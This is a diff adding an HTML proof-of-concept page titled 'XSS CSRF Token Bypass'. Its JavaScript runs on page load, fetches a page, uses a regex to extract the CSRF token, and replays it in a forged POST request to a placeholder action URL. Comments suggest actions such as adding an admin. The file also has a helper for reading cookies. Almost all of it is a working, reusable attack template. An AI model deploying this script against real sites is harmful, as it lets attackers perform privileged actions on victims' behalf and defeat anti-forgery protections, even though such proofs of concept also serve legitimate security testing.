@@ -1,0 +1,60 @@
+<!-- // !!! REQUIRES SAME ORIGIN AS TARGET URL !!! */ -->
+<html>
+<head></head>
+<body onload="get_src()">
+	<h1>POC -- XSS CSRF Token Bypass</h1>
+	
+<script>
+//Grab cookies if needed
+function getCookie(c_name) {
+    var c_value = " " + document.cookie;
+    var c_start = c_value.indexOf(" " + c_name + "=");
+    if (c_start == -1) {
+        c_value = null;
+    }
+    else {
+        c_start = c_value.indexOf("=", c_start) + 1;
+        var c_end = c_value.indexOf(";", c_start);
+        if (c_end == -1) {
+            c_end = c_value.length;
+        }
+        c_value = unescape(c_value.substring(c_start,c_end));
+    }
+    return c_value;
+}
+//Make call to page to get CSRF Token from html repsonse
+function get_src() {
+	ajax = new XMLHttpRequest();
+	//Page URL for token
+	ajax.open("GET", "/PAGE_SERVING_CSRF_TOKEN", true);
+	ajax.onreadystatechange = function () {
+		if (ajax.readyState == 4 && ajax.status == 200) {
+			var src = ajax.responseText;
+   			//var company_id = getCookie("COOKIE_NAME").replace(/\"/g, ''); //grab extra cookie if needed
+    			//alert(company_id); //test if needed
+			//regex for parsing token out of http response
+            		p = /name=\"csrf-token\"\ content=\"(.*)(?=\")/;
+            		var token = src.match(p)[1]; //grab parsed value
+            		//alert(token); //test if needed
+            		attack(token);
+        	}
+    }
+	ajax.send();
+}
+function attack(token) {
+	http_request = new XMLHttpRequest();
+	//action url / file
+ 	http_request.open("POST","/TARGET_ACTION_URL/",true);
+	//set grabbed token...place into header
+  	http_request.setRequestHeader("X-CSRF-Token", token);
+	//data to send AKA add admin...
+	data = "field1=value1&field2=value2";
+	http_request.setRequestHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
+	http_request.setRequestHeader("Content-length", data.length);
+	http_request.setRequestHeader("Connection", "close");
+	http_request.send(data);
+    	alert("DONE!");
+}
+    </script>
+</body>
+</html>
